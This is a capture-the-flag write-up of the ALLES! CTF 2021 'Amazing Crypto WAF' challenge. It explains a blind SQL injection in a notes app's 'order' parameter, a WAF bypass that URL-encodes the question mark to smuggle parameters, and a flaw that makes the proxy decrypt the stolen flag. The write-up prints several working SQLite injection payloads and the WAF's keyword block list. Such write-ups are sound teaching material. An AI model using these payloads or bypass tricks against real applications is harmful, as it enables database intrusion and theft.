### References

- [@Mohamed CHAMLI, ALLES! CTF 2021 / Amazing Crypto WAF, 2021-09-04](https://www.mohamed-chamli.me/blog/alles!%20ctf%202021/Amazing-Crypto-WAF)
- [@gml, 2021 ALLES!CTF Amazing Crypto WAF, 2021-09-05](https://igml.top/2021/09/05/2021-ALLESCTF/)
- [@LiveOverflow, Design Flaw in Security Product, 2021-10-26](https://www.youtube.com/watch?v=v784VBx9w8g)
- [@BugbOuntyReportsExplained, AmazingCryptoWAF walkthrough, 2021-10-26](https://www.youtube.com/watch?v=ZKrABs-N9wA)

**Tag: Blind SQL Injection, WAF Bypass, Encryption**

1.This is a very simple challenge, you can create an account / login and you can also post some notes. All source code and docker files is provided.

After reviewing the source code, we can find that there has a potential blind SQL injection in controller `/note`:

```python
@app.route('/notes')
@login_required
def notes():
    order = request.args.get('order', 'desc')
    notes = query_db(
        f'select * from notes where user = ? order by timestamp {order}',  # sql injection?
        [g.user['uuid']]
    )
    return render_template('notes.html', user=g.user, notes=notes)
```

In all `_db` functions, the queries are executed using prepared statements:

```python
def query_db(query, args=(), one=False):
    cur = get_db().execute(query, args)
    rv = cur.fetchall()
    cur.close()
    return (rv[0] if rv else None) if one else rv

def commit_db(query, args=()):
    get_db().cursor().execute(query, args)
    get_db().commit()
```

However, as in the code above, the user controllable `order` argument is spliced directly into the statement. Basically we can inject after `order by timestamp`, using this sqli we can leak all data on sqlite database including the flag.

the flag was located in the` flagger` account note, and it's encrypted:

```python
# create flag user
pw = uuid.uuid4().hex
flag = open('flag', 'rb').read()

s = requests.Session()
r = s.post(
    'http://127.0.0.1:1024/registerlogin',
    data={'username': 'flagger', 'password': pw},
    allow_redirects=False
)

s.post(
    'http://127.0.0.1:1024/add_note',
    data={'body': flag, 'title': 'flag'},
    allow_redirects=False
)
```

2.It is easily to confirm the conditional base SQL injection by using `asc limit 0`, but we cant keep going on as there have a WAF in another container and filtered some words:

```python
def waf_param(param):
    MALICIOUS = ['select', 'union', 'alert', 'script', 'sleep', '"', '\'', '<']
    for key in param:
        val = param.get(key, '')
        while val != unquote(val):
            val = unquote(val)

        for evil in MALICIOUS:
            if evil.lower() in val.lower():
                raise Exception('hacker detected')
```

here we need know the relationship between the two containers: the crypter works like a reverse proxy, and the app itself is not exposed, all requests are forwarded to the app via the crypter and sanitized by the `war_param` function:

```python
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=['POST', 'GET'])
def proxy(path):
    # Web Application Firewall
    try:
        waf_param(request.args)
        waf_param(request.form)
    except Exception:
        return 'error'
    # contact backend server
    ...
```

> Request --> Crypto WAF -(proxy through)-> App/back-end

Without `select` statement, the SQL injection process can be difficult, so we have to find a way to bypass the waf. Continue reviewing the proxy function:

```python
# contact backend server
proxy_request = None
query = request.query_string.decode()
headers = {'Cookie': request.headers.get('Cookie', None)}
if request.method == 'GET':
    proxy_request = requests.get(
        f'{BACKEND_URL}{path}?{query}',  # focus here
        headers=headers,
        allow_redirects=False
    )
elif request.method == 'POST':
    headers['Content-type'] = request.content_type
    proxy_request = requests.post(
        f'{BACKEND_URL}{path}?{query}',
        data=encrypt_params(request.form),
        headers=headers,
        allow_redirects=False
    )
```

maybe you've noticed it, the URL structure of the request. The `path` variable is a URL parameter, there are no explicit transformations here, but Flask auto decodes it. Here is a demonstration image from greg's video:

![](https://i.loli.net/2021/10/30/PX5x7foBSYyt4Oe.png)

Just URL-encode the question mark, then the request was sent with the question mark decoded. The proxy didn't consider `%3forder=asc&` to be parameters, but rather a part of the path.

Also, the `request.args` is null. so this way we can smuggle parameters without entering the waf function, in other words, we bypassed it.

Not use ampersand is also available, add a comment after the payload to avoid the end question mark. payload like:

```sql
/notes%3Forder=asc,(CASE WHEN (select substr((select body from notes where user=(select uuid from users where username='flagger')),%s,1)="%s" THEN randomblob(5000000000000) ELSE 1 END)--
```

3.It's time to create SQL injection script (due to sqlmap not work here), the above payload is a time-based injection statement, this will take enough time and will generate a tons of requests. Let's try ameliorate it.

Here we can try to control the return of the subquery inside the limit clause, if the condition was TRUE, return 0, if it wasn't, it would return 1. Use [IIF](https://sqlite.org/lang_corefunc.html#iif) will make it possible:

```sql
/notes%3Forder=asc LIMIT IIF(substr((select body from notes limit 1), 1,1)="%s",0,1)--
```

and because the flag was added as the first note, we can replacing nested subquery with `LIMIT 1`.

In addition, the author's `solve.py` also very awesome:

```sql
/notes%3Forder=,(abs((select IIF(substr(uuid,1,1)='%s', -9223372036854775808, 1) from users WHERE username='flagger' LIMIT 1)))--
```

we can notice the following code in the proxy function:

```python
proxy_request = requests.get/post...
if not proxy_request:
    return 'error'
```

Make the request error so that `proxy_request` is empty. As we can see in this payload above, it used `abs` built-in function, and its described in the [documentation](https://sqlite.org/lang_corefunc.html#abs) as follows:

> If X is the integer **-9223372036854775808** then abs(X) throws an integer overflow error since there is no equivalent positive 64-bit two complement value.

So in this case if the condition is TRUE, it throws error and the response also return 'error', otherwise the page will return normally.

But all of these payloads discussed so far generate a lot of useless traffic. In terms of this challenge, I prefer greg's approach. Just like he said: *I was able to exfiltrate the flag 95% faster than the native solution.*

Considering that we are in the limit clause, we are not restricted to returning 0 or 1. It can be any number. His idea was to add 128 notes and return the amount of notes equal to ASCII code of the next character of the flag. So each query returns as many notes as the ASCII code of the character.

```sql
/notes%3Forder=asc limit (select unicode(substr((select body from notes limit 1), %s, 1)))--
```

Then just count the amount of notes in the response.

4.The next issue is here, if we check the code again we can see that the app encrypts all data before inserting it into sqlite database and decrypts it again when requested:

```python
def proxy(path):
    ...
    elif request.method == 'POST':
        headers['Content-type'] = request.content_type
        proxy_request = requests.post(
            f'{BACKEND_URL}{path}?{query}',
            data=encrypt_params(request.form),  # Encrypted here
            headers=headers,
            allow_redirects=False
        )
    ...
    response_data = decrypt_data(proxy_request.content)  # Decrypted here
    ...
```

Even though we can leak the flag, how we can decrypt it? As the encryption is strong enough and can’t be exploited, which means the only way is to find out how we can make the app decrypt the flag for us. View the encryption and decryption functions:

```python
def encrypt_params(param):
    # We don't want to encrypt identifiers.
    # This is a default set of typical ID values.
    # In the future should be configurable per customer.
    IGNORE = ['uuid', 'id', 'pk', 'username', 'password']
    encrypted_param = {}
    for key in param:
        val = param.get(key, '')
        if key in IGNORE:
            encrypted_param[key] = val
        else:
            encrypted_param[key] = encrypt(val)

    return encrypted_param

def decrypt_data(data):
    cryptz = re.findall(r'ENCRYPT:[A-Za-z0-9+/]+=*', data.decode())
    for crypt in cryptz:
        try:
            data = data.replace(crypt.encode(), decrypt(crypt))
        except binascii.Error:
            data = data.replace(crypt.encode(), b'MALFORMED ENCRYPT')

    return data
```

There was a flaw in the code, exactly in the encryption function. The crypter does not excrypt `'uuid', 'id', 'pk', 'username', 'password'` but decrypted everything that had the string `ENCRYPT:` prepended.

So we can use this part and create an account with username as encrypted flag and once we are logged in the flag will be decrypted as the app decrypts all content of the response.

Other parameters may also be exploited, Global search those parameters in code we can find the `/delete_note` controller used the `uuid` in the redirect:

```python
@app.route('/delete_note', methods=['POST'])
@login_required
def delete_note():
    user = g.user['uuid']
    note_uuid = request.form['uuid']  # get
    commit_db(
        'delete from notes where uuid = ? and user = ?',
        [note_uuid, user]
    )
    return redirect(f'/notes?deleted={note_uuid}')  # use
```

![](https://i.loli.net/2021/10/31/RU7BQ14sjMxq85O.png)

So if we pass in a encrypted string here, we can see that the result will be the decrypted value now.

5.Finally, just run the exploit.py script

![](https://i.imgur.com/8MCcSOs.png)

